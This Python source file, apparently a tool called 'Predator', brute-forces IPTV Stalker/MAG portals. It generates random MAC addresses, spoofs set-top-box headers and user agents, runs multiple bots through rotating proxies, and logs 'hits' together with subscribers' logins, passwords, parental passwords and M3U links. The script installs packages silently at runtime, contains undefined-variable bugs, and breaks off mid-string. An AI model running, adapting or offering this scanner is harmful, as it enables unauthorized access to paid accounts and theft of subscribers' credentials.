import os,pip
import datetime,os
import socket,hashlib
import json,random,sys, time,re
from playsound import playsound
###################################################
hits='./Hits/Predator'
import os
if not os.path.exists(hits):
    os.mkdir(hits)
##################################################
#############################################
panel_list='./panel_list/'
if not os.path.exists(panel_list):
    os.mkdir(panel_list)
##############################################

try:
	if nickn=="":
		nickn="PAPY GOGO"
except:
	nickn="PAPY GOGO"
try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass
import subprocess
try:
	import threading
except:pass
import pathlib
#subprocess.run(["clear", ""])
try:
	import requests
except:
	print("requests modulu yüklü değil \n requests modulü yükleniyor \n")
	pip.main(['install', 'requests'])
import requests
try:
	import sock
except:
	print("sock modulu yüklü değil \n sock modulü yükleniyor \n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
import sock
#subprocess.run(["clear", ""])
import logging
try:
    import flag
except:
    pip.main(['install', 'emoji-country-flag'])
    import flag
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
global option
try:
	import cfscrape
	sesq= requests.Session()
	option = cfscrape.create_scraper(sess=sesq)
except:
	pip.main(['install', 'cfscrape'] )    
	import cfscrape
	sesq= requests.Session()
	option = cfscrape.create_scraper(sess=sesq)

os.system('cls')
logging.captureWarnings(True)
yanpanel="hata" 
imzayan="" 
bul=0
hitc=0
statusproxym=0
mtype=""
proxyslen=0

headers = {

}   
def statusproxy():
    if statusproxym==0:
        statusproxy="\33[0m\33[0m\33[0m\33[1;7;100m              PROXY MODE OFF               \33[0m\33"
        print(statusproxy)
    elif statusproxym==1:
        statusproxy="\33[0m\33[0m\33[0m\33[1;7;100m              PROXY MODE ON"+mtype+"\33[0m\33"
        print(statusproxy)
protocol=0        
macSayisi=999999999999991# 1#deneme sayisı
feyzo=("""\33[0m\33[33m╔══════════════════════════════════════    
║___  ____ ____ ___  ____ ___ ____ ____ 
║|__] |__/ |___ |  \ |__|  |  |  | |__/ 
║|    |  \ |___ |__/ |  |  |  |__| |  \     
║                                    
╚════════════════════════════════════       
\33[0m\33[0m\33[0m\33[1;7;100m       ** ((( ALL IN ONE ))) **       \33[0m
\33[1;44m  ** PREDATOR **MOD BY [* PAPY GOGO *]    \33[0m
\33[0m\33[1;7;100m            BEST IPTV TEAMS             \33[0m
""")
print("\033[H\033[J", end="")
statusproxy()
print(feyzo)
kisacikti=""
ozelmac=""
#################
nick='PAPY GOGO'
bekleme=1
isimle=""

introop="""	\33[1;31m \33[0m\33[1;32mSELECT SCAN METHOD  \33[36m
	
	\33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mMAC PORTAL  \33[36m    
	\33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mM3U \33[36m

	\33[1;31m0 \33[0m\33[1;32m= \33[0m \33[36mACTIVATE PROXY MODE \33[36m


\33[36m
OPTION = \33[36m\33[36m\33[36m"""
introop=introop+"""\33[0m"""

selectop = input(introop)
print('\33[0m')   

if selectop=="0":
    mtype="                "
    proxy = requests.session()
    option=proxy
    statusproxym=1
    print("\033[H\033[J", end="")
    statusproxy()
    print(feyzo)    
    dirp='./proxies/' 
    say=0
    dsy=""
    for files in os.listdir (dirp):
        say=say+1
        dsy=dsy+"	\33[1;31m"+str(say)+"\33[0m\33[1;32m = \33[0m \33[36m"+files+'\33[36m\n'
    print ("""
	\33[1;31m \33[0m\33[1;32mSELECT PROXY FILE  \33[36m
        	
"""+dsy+"""""")
    proxyfile=str(input("""\33[36m
OPTION = \33[36m\33[36m\33[36m"""))
    say=0
        
    
    print("\033[H\033[J", end="")
    statusproxy()
    print(feyzo)
    typeproxy="""	\33[1;31m \33[0m\33[1;32mSELECT PROXY TYPE  \33[36m
    	
	\33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36m HTTP  \33[36m    
	\33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36m SOCKS 4 \33[36m
	\33[1;31m3 \33[0m\33[1;32m= \33[0m \33[36m SOCKS 5 \33[36m
    
    
\33[36m
OPTION = \33[36m\33[36m\33[36m"""
    typeproxy=typeproxy+"""\33[0m"""
    proxyoption=input(typeproxy)    

    if proxyoption=="":
        print("ERROR: Select proxy protocol")
        quit()
        
 
      
    if proxyoption=="1":        
        protocol=1
        mtype=" [HTTP]         "
    elif proxyoption=="2":
        protocol=2
        mtype=" [SOCK4]        "
    elif proxyoption=="3":
        protocol=3
        mtype=" [SOCK5]        "
    else:
        print("ERROR: Incorrect Option")
        quit()
        
    print("\033[H\033[J", end="")
    statusproxy()
    print(feyzo)
    introop="""	\33[1;31m \33[0m\33[1;32mSELECT SCAN METHOD  \33[36m
    	
	\33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mMAC PORTAL  \33[36m    
	\33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mM3U \33[36m
    
    	
	\33[1;32m[ PROXY MODE ON ]\33[36m
    
    
\33[36m
OPTION = \33[36m\33[36m\33[36m"""
    introop=introop+"""\33[0m"""
    
    selectop = input(introop)
    print('\33[0m')   

    
if selectop=="1":    
    intro="""	\33[1;31m \33[0m\33[1;32mSELECT PORTAL TYPE  \33[36m

    	 \33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mPORTAL.PHP  \33[36m    
    	 \33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mSTALKER_PORTAL \33[36m
    	 \33[1;31m3 \33[0m\33[1;32m= \33[0m \33[36mPORTALSTB \33[36m
    	 \33[1;31m4 \33[0m\33[1;32m= \33[0m \33[36mSERVER/LOAD.PHP \33[36m
    	 \33[1;31m5 \33[0m\33[1;32m= \33[0m \33[36mC/PORTAL.PHP (xui)\33[36m
    	 \33[1;31m6 \33[0m\33[1;32m= \33[0m \33[36mC/SERVER/LOAD.PHP (xui)\33[36m
    	 \33[1;31m7 \33[0m\33[1;32m= \33[0m \33[36mBS.MAG.PORTAL.PHP \33[36m
    	 \33[1;31m8 \33[0m\33[1;32m= \33[0m \33[36mPORTALCC.PHP \33[36m
    	 \33[1;31m9 \33[0m\33[1;32m= \33[0m \33[36mMAGLOAD.PHP \33[36m
    	\33[1;31m10 \33[0m\33[1;32m= \33[0m \33[36mMINISTRA/PORTAL.PHP \33[36m
    	\33[1;31m11 \33[0m\33[1;32m= \33[0m \33[36mK/PORTAL.PHP \33[36m
    	\33[1;31m12 \33[0m\33[1;32m= \33[0m \33[36mMAGLOVE/PORTAL.PHP \33[36m
    	\33[1;31m13 \33[0m\33[1;32m= \33[0m \33[36mP/PORTAL.PHP \33[36m
    	\33[1;31m14 \33[0m\33[1;32m= \33[0m \33[36mMAGACCESS/PORTAL.PHP \33[36m
    	\33[1;31m15 \33[0m\33[1;32m= \33[0m \33[36mPORTALMEGA.PHP \33[36m
    	\33[1;31m16 \33[0m\33[1;32m= \33[0m \33[36mMAGPORTAL/PORTAL.PHP \33[36m
    	\33[1;31m17 \33[0m\33[1;32m= \33[0m \33[36mPOWERFULL/PORTAL.PHP \33[36m
    	\33[1;31m18 \33[0m\33[1;32m= \33[0m \33[36mMAGPORTAL/SERVER/LOAD.PHP \33[36m    
    
\33[36m
Option = \33[36m\33[36m\33[36m"""
    intro=intro+"""\33[0m"""
    print("\033[H\033[J", end="")
    statusproxy()
    print(feyzo)
    panel = input(intro)
    print('\33[0m')
    speed=""
    options=""
    urib=""
    buri=""
    uzmanmc=""
    uzmanm2=""
    uzmanm="portal.php"
    useragent="okhttp/4.7.1"
    if panel=="0":
        	uzmanm=input('Portal = ')
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
 
    if panel=="" or panel=="1":
        	uzmanm="portal.php"
        	buri="/c/"    	
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
     	
    if panel=="2":
        	uzmanm="stalker_portal/server/load.php"
        	uzmanmc="stalking"
        	urib="/stalker_portal"
        	buri="/c/"
        	options="S"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"


    if panel=="3":
        	uzmanm="portalstb/portal.php"
        	uzmanm2="/portalstb"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="4":
        	uzmanm="server/load.php"
        	buri="/c/"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="5":
        	uzmanm="c/portal.php"
        	buri="/c/"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="6":
        	uzmanm="c/server/load.php"
        	buri="/c/"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="7":
        	uzmanm="bs.mag.portal.php"
        	buri="/c/"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="8":
        	uzmanm="portalcc.php"
        	buri="/c/"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="9":
        	uzmanm="magload.php"
        	buri="/c/"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="10":
        	uzmanm="ministra/portal.php"
        	uzmanm2="/ministra"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="11":
        	uzmanm="k/portal.php"
        	uzmanm2="/k"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="12":
        	uzmanm="maglove/portal.php"
        	uzmanm2="/maglove"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="13":
        	uzmanm="p/portal.php"
        	uzmanm2="/p"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="14":
        	uzmanm="magaccess/portal.php"
        	uzmanm2="/magaccess"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="15":
        	uzmanm="portalmega.php"
        	buri="/c/"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="16":
        	uzmanm="magportal/portal.php"
        	buri="/c/"
        	uzmanm2="/magportal"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="17":
        	uzmanm="powerfull/portal.php"
        	uzmanm2="/powerfull"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

    if panel=="18":
        	uzmanm="magportal/server/load.php"
        	buri="/c/"
        	uzmanm2="/magportal"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    realblue=""
    if panel=="4":
    	realblue="real"
    print('\33[0m')	
    print(panel)
    kanalkata="0"
    panel='feyzo'


    print("\033[H\033[J", end="")
    statusproxy()
    print(feyzo)    
    
    #ss=input()
    totLen="000000"
    dosyaa=""
    yeninesil=(
    'D4:CF:F9:',
    '33:44:CF:',
    '10:27:BE:',
    'A0:BB:3E:',
    '55:93:EA:',  
    '04:D6:AA:',
    '11:33:01:',
    '00:1C:19:',
    '1A:00:6A:',
    '1A:00:FB:',
    '00:A1:79:',
    '00:1B:79:',
    '00:2A:79:',
    '00:1A:79:',
    )
    
    multim="""  
    	\33[1;31m \33[0m\33[1;32mSCAN MULTI PORTALS ?  \33[36m    
    	
    	\33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mYES \33[36m
    	\33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mNO \33[36m
    
    
\33[36m
OPTION = \33[36m\33[36m\33[36m"""
    multim=multim+"""\33[0m"""
    
    multipanel = input(multim)
    print('\33[0m')
    opcionuni=""
    paneles=""
    print("\033[H\033[J", end="")
    statusproxy()
    print(feyzo) 
    if multipanel == "1":
     	dir='./panel_list/' 	
     	if not os.path.exists(dir):
      	   os.mkdir(dir)
     	if "1"=="1":
      		say=0
      		dsy=""
    
     	for files in os.listdir (dir):
     		say=say+1
     		dsy=dsy+"	\33[1;31m"+str(say)+"\33[0m\33[1;32m = \33[0m \33[36m"+files+'\33[36m\n'
     	print ("""
    	\33[1;31m \33[0m\33[1;32mSELECT COMBO FILE  \33[36m
    	
    """+dsy+"""
    	""")
     	paneles=str(input("""\33[36m
OPTION = \33[36m\33[36m\33[36m"""))
     	say=0
    else:
     	print("\033[H\033[J", end="")
     	statusproxy()
     	print(feyzo) 
     	print("""
    	\33[1;31m \33[0m\33[1;32mWRITE PORTAL URL\33[36m""")
     	opcionuni=input("""\33[36m
PORTAL = \33[36m\33[36m\33[36m""")
    if opcionuni == "":
        if multipanel == "1":
            opcionuni="MULTISCAN HITS"
        else:
            opcionuni="144.217.77.180/stalker_portal"
    while True:
        print("\033[H\033[J", end="")
        statusproxy()
        print(feyzo) 
        print("""
    	\33[1;31m \33[0m\33[1;32mSELECT NUMBER OF BOTS\33[36m
    	
    	\33[1;31mBOTS OPTIONS  \33[0m\33[1;32m= \33[0m \33[36m1 - 15 \33[36m
    """)
        opcionbots=input("""\33[36m
BOTS = \33[36m\33[36m\33[36m""")
        opcionbots=int(opcionbots)
        if opcionbots <= 15:
            break    
    print("\033[H\033[J", end="")
    statusproxy()
    print(feyzo) 
    macuz=input("""
    	\33[1;31m \33[0m\33[1;32mWRITE THE NUMBER OF MACS\33[36m	
    		
    	\33[1;31m*\33[0m \33[36mDEFAULT MAC FORMAT = 00:1A:79:XX:XX\33[36m
    	\33[1;31m0 \33[0m\33[1;32m= \33[0m \33[36mCHANGE MAC FORMAT \33[36m

\33[36m    	
NUMBER OF MACS = \33[36m\33[36m\33[36m""")
    
    changeformat=macuz
    if macuz=="":
    	macuz=30000
    macuz=int(macuz) 
    #print(macuz)
     		
    if "1"=="1":
     	dsyno="0"
     	say=0
     	mactur=14
     	mactur=yeninesil[int(mactur)-1]
     	if changeformat=="0":
     		print("\033[H\033[J", end="")
     		statusproxy()
     		print(feyzo) 
     		nnesil=str(yeninesil)
     		nnesil=(nnesil.count(',')+1)
     		print(" ")
     		print("	\33[1;31m \33[0m\33[1;32mTYPE OF MACS\33[36m")
     		print(" ")
     		for xd in range(0,(nnesil)):
     			tire='  ='
     			if int(xd) <9:
     				tire='   =' 			
     			print("	"+str(xd+1)+"\33[1;31m"+tire+"\33[0m \33[36m"+yeninesil[xd]+"\33[36m")
     		mactur=input("""
     			
    \33[1;31m*\33[0m \33[36mDEFAULT OPTION: 14 \33[36m

\33[36m    
MAC FORMAT = \33[36m\33[36m\33[36m""")
     		mactur=yeninesil[int(mactur)-1]     		
     		#print(mactur)     		
     		print("\033[H\033[J", end="")
     		statusproxy()
     		print(feyzo) 
     		macuz=input("""
    \33[1;31m \33[0m\33[1;32mWRITE THE NUMBER OF MACS\33[36m		

\33[36m    
NUMBER OF MACS = \33[36m\33[36m\33[36m""")
     		if macuz=="":
     			macuz=30000
     		macuz=int(macuz) 
     		print(macuz) 		 		
    	 	say=0
    	 	
     	print("\033[H\033[J", end="")
     	statusproxy()
     	print(feyzo) 
    
    #print(mactur)
    #quit()
    kanalkata=""
    kanalkata=input("""  
    \33[1;31m \33[0m\33[1;32mCATEGORY CONTENT  \33[36m    
    	
    \33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mLIVE ONLY \33[36m
    \33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mLIVE AND VOD \33[36m
    \33[1;31m3 \33[0m\33[1;32m= \33[0m \33[36mALL CONTENT [LIVE, VOD, SERIES] \33[36m
    
    
\33[36m
OPTION = \33[36m\33[36m\33[36m""")
    if kanalkata=="":
    	kanalkata="1"
    
    
    ip=""
    fname=""
    adult=""
    play_token=""
    acount_id=""
    stb_id=""
    stb_type=""
    sespas=""
    stb_c=""
    timezon=""
    tloca=""
    scountry=""
    stariff=""
    slogin=""
    smaxonline=""
    sparent=""
    ssettings=""
    spass=""
    stariffplan=""
    jdata=""
    veri_stalker=""
    sip=""
    istalker=""
    
           
    import os,platform,sys
    
    acount_id=""
    a="0123456789ABCDEF"
    sd=0
    vpnsay=0
    hitsay=0
    onsay=0
    sdd=0
    vsay=0
    bad=0
    proxies=""
    say=1
    print("\033[H\033[J", end="")
    statusproxy()
    print(feyzo) 
    dosyaadi=str(input("""
    \33[1;31m \33[0m\33[1;32mFILE NAME TO SAVE  \33[36m    
    
\33[36m
Name OF File = \33[36m\33[36m\33[36m"""))
    if dosyaadi=="":
    	dosyaadi="Predator_Hits"
    hits='./Hits/'
    if not os.path.exists(hits):
        os.mkdir(hits)
    dosyaadi=dosyaadi+"_Predator"
    Dosyab="./Hits/Predator/Predator_" + opcionuni.replace(":","_").replace('/','') +".txt"
    say=1
    print("\033[H\033[J", end="")
    statusproxy()
    print(feyzo)
    print("""
    
    \33[1;31m* \33[0m\33[0m \33[36mLoading... \33[36m""")
    def yax(hits):
        dosya=open(Dosyab,'a+', encoding='utf-8') 
        dosya.write(hits)
        dosya.close()	
        
    def month_string_to_number(ay):
        m = {
            'jan': 1,
            'feb': 2,
            'mar': 3,
            'apr':4,
             'may':5,
             'jun':6,
             'jul':7,
             'aug':8,
             'sep':9,
             'oct':10,
             'nov':11,
             'dec':12
            }
        s = ay.strip()[:3].lower()
        try:
            out = m[s]
            return out
        except:
            raise ValueError('Not a month')
    import time
    from datetime import date
    def tarih_clear(trh):
    	#trh=tarih_exp
    	ay=""
    	gun=""
    	yil=""
    	trai=""
    	my_date=""
    	sontrh=""
    	out=""
    	ay=str(trh.split(' ')[0])
    	gun=str(trh.split(', ')[0].split(' ')[1])
    	yil=str(trh.split(', ')[1])
    	ay=str(month_string_to_number(ay))
    	#print(ay)
    	trai=str(gun)+'/'+str(ay)+'/'+str(yil)
    	my_date = str(trai)
    	#print(my_date)
    	if 1==1:
    		
    		d = date(int(yil), int(ay), int(gun))
    		sontrh = time.mktime(d.timetuple())
    		out=(int((sontrh-time.time())/86400))
    		return out
    	#except:pass
    macs=""	
    sayi=1
    
    def randommac():
    	try:
    		genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
    		#print(genmac)
    	except:pass
    	genmac=genmac.replace(':100',':10')
    	return genmac
         
                       
    	
    def buscarj(s, first, last):
            try:
                start = s.index(first) + len(first)
                end = s.index(last, start)
                return s[start:end]
            except ValueError:
                return ''
                	
    def url1(panel):
    	url="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml" 
    	return url
    try:
    	if macsv=="":
    		mac=""
    except:
    	macsv=""
    def url22(panel,macs):
    	url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml"

    	if uzmanmc=="stalking":
    		url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&random="+str(random)+"&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22"+str(random)+"%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566" 
    
    	if realblue=="real":
    		url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
    	return url2
    		
    def url3(panel):
    	url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml" 
    	return url3
    
    def url5(panel):
    	url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"
    	return url5
    
    def url6(panel):
    	url6="http://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
    	return url6
    
    def liveurl(panel):
    	liveurl="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
    	return liveurl
    
    def vodurl(panel):
    	vodurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
    	return vodurl
    
    def seriesurl(panel):
    	seriesurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"
    	return seriesurl
    
    def url(cid,panel):
    	url7="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
    	return url7
    
    
    def hea1(panel, macs):
    	HEADERA={
    "User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
    "Referer": "http://"+panel+"/c/" ,
    "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
    "Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
    "Accept-Encoding": "gzip, deflate" ,
    "Connection": "Keep-Alive" ,
    "X-User-Agent":"Model: MAG254; Link: Ethernet",
    }
    	return 	HEADERA
    
    def hea2(macs,token,panel):
    	tokens=token
    	#if macsv=="":
    	#	macs=macs.replace('%3A','')
    	#	tokens=str(token)+str(token)
    	HEADERd={
    "User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
    "Referer": "http://"+panel+"/c/" ,
    "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
    "Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
    "Accept-Encoding": "gzip, deflate" ,
    "Connection": "Keep-Alive" ,
    "X-User-Agent":"Model: MAG254; Link: Ethernet",
    "Authorization": "Bearer "+tokens,
    	}
    	return HEADERd
    
    def hea3(panel):
    	hea={
    "Icy-MetaData": "1",
    "User-Agent": "Lavf/57.83.100", 
    "Accept-Encoding": "identity",
    "Host": panel,
    "Accept": "*/*",
    "Range": "bytes=0-",
    "Connection": "close",
    	}
    	return hea
    hityaz=0
    m3uonline=0
    m3uoffline=0
    def stalker(veri_stalkerp, veri_stalker, panel):
        		
        		stalker=''        		
        		global m3uonline, m3uoffline
        		try:
        		  	sfname=veri_stalkerp.split('"fname":"')[1]
        		  	sfname=sfname.split('"')[0]
        		  	spass=veri_stalkerp.split('"password":"')[1]
        		  	spass=spass.split('"')[0]
        		  	scountry=veri_stalkerp.split('country":"')[1]
        		  	scountry=scountry.split('"')[0]        		  	
        		  	smaxonline=veri_stalkerp.split('max_online":"')[1]
        		  	smaxonline=smaxonline.split('"')[0]
        		  	slogin=veri_stalkerp.split('login":"')[1]
        		  	slogin=slogin.split('"')[0]
        		  	stariff=veri_stalkerp.split('tariff_plan_id":"')[1]
        		  	stariff=stariff.split('"')[0]
        		  	stariffplan=veri_stalker.split('tariff_plan":"')[1]
        		  	stariffplan=stariffplan.split('"')[0]
        		  	ssettings=veri_stalkerp.split('settings_password":"')[1]
        		  	ssettings=ssettings.split('"')[0]
        		  	sparent=veri_stalkerp.split('parent_password":"')[1]
        		  	sparent=sparent.split('"')[0]
        		  	panel=panel.replace("/stalker_portal", "")    		  	   			
        		  	m3u_link="http://"+panel+"/get.php?username="+slogin+"&password="+spass+"&type=m3u_plus&output=m3u8"
        		  	try:
        		  	   req=str(option.get(m3u_checkurl, timeout=(2,5), allow_redirects=False,stream=True).status_code)
        		  	   if req == "200" or (req == "302"):
        		  	      link_status="✅ ONLINE"
        		  	   else:
        		  	      link_status="🛑 OFFLINE"
        		  	except:
        		  	   link_status="🛑 OFFLINE"    		  	      
        		  	try:
        		  	   req=""
        		  	   req=option.get(m3u_link, timeout=(2,5), allow_redirects=False,stream=True)
        		  	   m3u_text=(req.text)
        		  	   m3u_split=m3u_text.split("http://")[1]
        		  	   m3u_split=m3u_split.split("#EXTINF:")[0]
        		  	   m3u_checkurl="http://"+m3u_split
        		  	   req=str(option.get(m3u_checkurl, timeout=(2,5), allow_redirects=False,stream=True).status_code)
        		  	   if req == "200" or (req == "302"):
        		  	      m3uonline+=1
        		  	      m3u_check="""
        		  	      
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├● STATUS LINK ⧪
├● """+link_status+"""
├● STATUS CHANNEL ⧪
├● ✅ ONLINE
╰● M3U ➤ """+m3ulink+"""
    """
        		  	      
        		  	   else:
        		  	      m3uoffline+=1
        		  	      m3u_check="""
        		  	      
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├● STATUS LINK ⧪
├● """+link_status+"""
├● STATUS CHANNEL ⧪
├● 🛑 OFFLINE
╰● M3U ➤ """+m3ulink+"""
     """
        		  	      
        		  	except:
        		  	   m3uoffline+=1
        		  	   m3u_check="""
        		  	   
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├● STATUS LINK ⧪
├● """+link_status+"""
├● STATUS CHANNEL ⧪
├● 🛑 OFFLINE
╰● M3U ➤ """+m3ulink+"""
     """
        		  	
        		  	stalker="""    		  	
╭─➤ ❪❪ 💎 🆂🆃🅰🅻🅺🅴🆁 💎 ❫❫
├● Login ➤ """+str(slogin)+"""
